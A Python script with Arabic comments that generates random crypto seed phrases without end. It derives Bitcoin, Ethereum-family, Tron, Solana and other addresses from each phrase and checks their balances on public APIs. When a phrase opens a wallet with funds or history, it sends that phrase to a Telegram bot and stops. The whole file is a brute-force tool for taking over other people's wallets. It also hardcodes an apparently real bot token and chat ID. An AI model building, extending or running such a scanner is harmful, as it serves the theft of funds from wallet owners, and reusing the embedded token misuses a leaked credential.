import os
import time
import requests
import sys
import concurrent.futures
from mnemonic import Mnemonic
from bip_utils import (
    Bip39SeedGenerator,
    Bip44, Bip49, Bip84,
    Bip44Coins, Bip49Coins, Bip84Coins,
    Bip44Changes
)

# ==================== إعدادات تيليجرام ====================
TELEGRAM_BOT_TOKEN = "8897941421:AAGQr6u8JtvBTS_MRrLgWjOuxxkIKW4yXq0"
TELEGRAM_CHAT_ID = "887943221"

# ==================== إعدادات التشييك (Test) ====================
# ضع الكلمات هنا للتشييك عليها عند التشغيل، وإذا لم ترد اتركها فارغة بين علامتي التنصيص ""
TEST_MNEMONIC = ""

# ضع العنوان هنا للتشييك عليه عند التشغيل، وإذا لم ترد اتركه فارغاً بين علامتي التنصيص ""
TEST_ADDRESS = "0x70599B23CF2a064d656643282a3C679F3fF03beB"

SESSION = requests.Session()
SESSION.headers.update({
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WalletScanner/4.0"
})

EVM_NETWORKS = {
    "BSC (BEP20)": {
        "rpcs": ["https://bsc-rpc.publicnode.com", "https://binance.llamarpc.com"],
        "symbol": "BNB",
        "tokens": {"USDT": ("0x55d398326f99059fF775485246999027B3197955", 18)}
    },
    "Ethereum (ERC20)": {
        "rpcs": ["https://ethereum-rpc.publicnode.com", "https://eth.llamarpc.com"],
        "symbol": "ETH",
        "tokens": {"USDT": ("0xdAC17F958D2ee523a2206206994597C13D831ec7", 6)}
    },
    "Polygon (MATIC)": {
        "rpcs": ["https://polygon-bor-rpc.publicnode.com", "https://polygon.llamarpc.com"],
        "symbol": "MATIC",
        "tokens": {"USDT": ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6)}
    }
}

SOLANA_RPCS = [
    "https://solana-rpc.publicnode.com",
    "https://api.mainnet-beta.solana.com"
]


# ==================== دوال تيليجرام ====================

def send_telegram_alert(alert_text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": alert_text, "parse_mode": "HTML"}
    try:
        SESSION.post(url, json=payload, timeout=7)
    except Exception as e:
        print(f"❌ خطأ في إرسال رسالة تيليجرام: {e}")


# ==================== دوال الاشتقاق والفحص ====================

def derive_all_wallet_addresses(mnemonic_phrase, num_accounts=1):
    seed_bytes = Bip39SeedGenerator(mnemonic_phrase).Generate()
    derived = {
        "EVM": [], "BTC_Native": [], "BTC_SegWit": [],
        "BTC_Legacy": [], "TRX": [], "SOL": [], "LTC": [], "DOGE": []
    }

    for i in range(num_accounts):
        derived["EVM"].append(Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["BTC_Native"].append(Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["BTC_SegWit"].append(Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["BTC_Legacy"].append(Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["TRX"].append(Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["SOL"].append(
            Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(i).PublicKey().ToAddress())
        derived["LTC"].append(Bip84.FromSeed(seed_bytes, Bip84Coins.LITECOIN).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())
        derived["DOGE"].append(Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN).Purpose().Coin().Account(0).Change(
            Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress())

    for k in derived:
        derived[k] = list(dict.fromkeys(derived[k]))
    return derived


def rpc_call(rpc_url, method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    response = SESSION.post(rpc_url, json=payload, timeout=5)
    if response.status_code == 200:
        data = response.json()
        if "result" in data and data["result"] is not None:
            return data["result"]
    raise Exception("RPC Error")


def scan_evm_address(address, net_name, net_config):
    for rpc_url in net_config["rpcs"]:
        try:
            bal_hex = rpc_call(rpc_url, "eth_getBalance", [address, "latest"])
            native_balance = int(bal_hex, 16) / (10 ** 18)
            tx_hex = rpc_call(rpc_url, "eth_getTransactionCount", [address, "latest"])
            tx_count = int(tx_hex, 16)
            return {"network": net_name, "address": address, "connected": True, "balance": native_balance,
                    "tx_count": tx_count, "symbol": net_config["symbol"]}
        except Exception:
            continue
    return {"network": net_name, "address": address, "connected": False}


def scan_bitcoin_address(address, btc_type):
    for url in [f"https://blockstream.info/api/address/{address}", f"https://mempool.space/api/address/{address}"]:
        try:
            res = SESSION.get(url, timeout=5)
            if res.status_code == 200:
                data = res.json()
                chain = data.get("chain_stats", {})
                bal = (chain.get("funded_txo_sum", 0) - chain.get("spent_txo_sum", 0)) / (10 ** 8)
                txs = chain.get("tx_count", 0)
                return {"network": f"Bitcoin ({btc_type})", "address": address, "connected": True, "balance": bal,
                        "tx_count": txs, "symbol": "BTC"}
        except Exception:
            continue
    return {"network": f"Bitcoin ({btc_type})", "address": address, "connected": False}


def scan_tron_address(address):
    try:
        url = f"https://apilist.tronscanapi.com/api/accountv2?address={address}"
        res = SESSION.get(url, timeout=5)
        if res.status_code == 200:
            data = res.json()
            bal = float(data.get("balance", 0)) / (10 ** 6)
            txs = int(data.get("totalTransactionCount", 0))
            return {"network": "Tron", "address": address, "connected": True, "balance": bal, "tx_count": txs,
                    "symbol": "TRX"}
    except Exception:
        pass
    return {"network": "Tron", "address": address, "connected": False}


def scan_solana_address(address):
    for rpc_url in SOLANA_RPCS:
        try:
            bal_res = rpc_call(rpc_url, "getBalance", [address])
            sol_bal = bal_res.get("value", 0) / (10 ** 9)
            sigs = rpc_call(rpc_url, "getSignaturesForAddress", [address, {"limit": 1}])
            tx_count = len(sigs) if isinstance(sigs, list) else 0
            return {"network": "Solana", "address": address, "connected": True, "balance": sol_bal,
                    "tx_count": tx_count, "symbol": "SOL"}
        except Exception:
            continue
    return {"network": "Solana", "address": address, "connected": False}


def scan_wallet_concurrently(wallets):
    """فحص جميع الشبكات لنفس المحفظة بشكل متزامن لزيادة السرعة"""
    tasks = []
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for btc_type in ["BTC_Native", "BTC_SegWit", "BTC_Legacy"]:
            for addr in wallets[btc_type]:
                tasks.append(executor.submit(scan_bitcoin_address, addr, btc_type))

        for addr in wallets["EVM"]:
            for net_name, net_config in EVM_NETWORKS.items():
                tasks.append(executor.submit(scan_evm_address, addr, net_name, net_config))

        for addr in wallets["TRX"]:
            tasks.append(executor.submit(scan_tron_address, addr))

        for addr in wallets["SOL"]:
            tasks.append(executor.submit(scan_solana_address, addr))

        for future in concurrent.futures.as_completed(tasks):
            res = future.result()
            if res["connected"] and (res.get("balance", 0) > 0 or res.get("tx_count", 0) > 0):
                return res  # إرجاع النتيجة فور العثور على أي رصيد/معاملات لتسريع الإيقاف
    return None


def scan_single_address_any_network(address):
    """تحديد شبكة العنوان يدوياً وفحصه"""
    if address.startswith("0x"):
        for net_name, net_config in EVM_NETWORKS.items():
            res = scan_evm_address(address, net_name, net_config)
            if res["connected"] and (res.get("balance", 0) > 0 or res.get("tx_count", 0) > 0): return res
    elif address.startswith(("1", "3", "bc1")):
        res = scan_bitcoin_address(address, "Unknown_Type")
        if res["connected"] and (res.get("balance", 0) > 0 or res.get("tx_count", 0) > 0): return res
    elif address.startswith("T") and len(address) == 34:
        res = scan_tron_address(address)
        if res["connected"] and (res.get("balance", 0) > 0 or res.get("tx_count", 0) > 0): return res
    else:
        res = scan_solana_address(address)
        if res["connected"] and (res.get("balance", 0) > 0 or res.get("tx_count", 0) > 0): return res
    return None


# ==================== إدارة بدء التشغيل (Test Phase) ====================

def run_startup_test():
    if not TEST_MNEMONIC and not TEST_ADDRESS:
        send_telegram_alert("✅ <b>تم تشغيل الكود بنجاح.</b>\nلا يوجد محفظة تشييك أو عنوان.")
        return

    test_msg = "✅ <b>تم تشغيل الكود بنجاح.</b>\n\n<b>نتائج محفظة التشييك:</b>\n"
    found_any = False
    error_occurred = False

    try:
        if TEST_MNEMONIC:
            wallets = derive_all_wallet_addresses(TEST_MNEMONIC)
            active_data = scan_wallet_concurrently(wallets)
            if active_data:
                found_any = True
                test_msg += (f"🔑 كلمات التشييك: <code>{TEST_MNEMONIC}</code>\n"
                             f"🌐 الشبكة: {active_data['network']}\n"
                             f"📬 العنوان: {active_data['address']}\n"
                             f"💎 الرصيد: {active_data['balance']:.6f} {active_data['symbol']}\n"
                             f"📊 المعاملات: {active_data['tx_count']}\n\n")

        if TEST_ADDRESS:
            active_data = scan_single_address_any_network(TEST_ADDRESS)
            if active_data:
                found_any = True
                test_msg += (f"📬 عنوان التشييك: <code>{TEST_ADDRESS}</code>\n"
                             f"🌐 الشبكة: {active_data['network']}\n"
                             f"💎 الرصيد: {active_data['balance']:.6f} {active_data['symbol']}\n"
                             f"📊 المعاملات: {active_data['tx_count']}\n")
    except Exception as e:
        error_occurred = True
        print(f"Test Error: {e}")

    if found_any:
        send_telegram_alert(test_msg)
    elif error_occurred or not found_any:
        send_telegram_alert(
            "⚠️ <b>تم تشغيل الكود.</b>\nيوجد محفظة تشييك ولكن حدثت مشكلة في الاستلام أو لم يتم العثور على معاملات.")


# ==================== الإيقاف وإرسال الإنذار النهائي ====================

def trigger_alert_and_stop(phrase, active_data):
    alert_message = (
        f"🚨 <b>تنبيه هام جداً! يرجى الحذر</b> 🚨\n\n"
        f"تم العثور على محفظة مستخدمة سابقاً وهي:\n\n"
        f"🔑 <b>الكلمات:</b> <code>{phrase}</code>\n"
        f"🌐 <b>الشبكة:</b> {active_data['network']}\n"
        f"📬 <b>العنوان:</b> <code>{active_data['address']}\n</code>"
        f"💎 <b>الرصيد:</b> {active_data['balance']:.6f} {active_data['symbol']}\n"
        f"📊 <b>المعاملات:</b> {active_data['tx_count']}\n\n"
        f"🛑 <i>تم إيقاف البوت. قم بتشغيله يدوياً مرة أخرى.</i>"
    )

    terminal_alert = (
        f"\n{'=' * 75}\n"
        f"🚨 [تم العثور على معاملات / رصيد! تم إيقاف البحث فوراً] 🚨\n"
        f"🔑 الكلمات: {phrase}\n"
        f"🌐 الشبكة: {active_data['network']}\n"
        f"📬 العنوان: {active_data['address']}\n"
        f"💎 الرصيد: {active_data['balance']:.6f} {active_data['symbol']}\n"
        f"📊 المعاملات: {active_data['tx_count']}\n"
        f"🛑 تم إيقاف البوت كما طلبت.\n"
        f"{'=' * 75}\n"
    )

    print(terminal_alert)
    send_telegram_alert(alert_message)
    sys.exit(0)


# ==================== المحرك الرئيسي (التوليد والفحص المباشر) ====================

def run_continuous_scanner():
    run_startup_test()

    mnemo = Mnemonic("english")
    total_checked = 0
    recent_50_mnemonics = []

    print("\n🚀 بدء التوليد والفحص المباشر...")

    while True:
        total_checked += 1
        phrase = mnemo.generate(strength=128)

        print(f"\n🔄 [فحص المحفظة رقم {total_checked}] الكلمات: {phrase}")
        wallets = derive_all_wallet_addresses(phrase, num_accounts=1)
        active_data = scan_wallet_concurrently(wallets)

        if active_data:
            # تم إيجاد رصيد أو معاملات!
            trigger_alert_and_stop(phrase, active_data)
        else:
            print("✅ لا يوجد رصيد ولا معاملات. الكود نظيف.")
            recent_50_mnemonics.append(phrase)

        # إرسال تقرير كل 50 محفظة
        if len(recent_50_mnemonics) == 50:
            msg = "📋 <b>قائمة آخر 50 محفظة تم فحصها وكانت نظيفة:</b>\n\n"
            for i, p in enumerate(recent_50_mnemonics, 1):
                msg += f"{i}- <code>{p}</code>\n"
            msg += f"\n📊 <b>تم فحص إلى الآن {total_checked} محفظة.</b>"

            send_telegram_alert(msg)
            recent_50_mnemonics.clear()


if __name__ == "__main__":
    run_continuous_scanner()
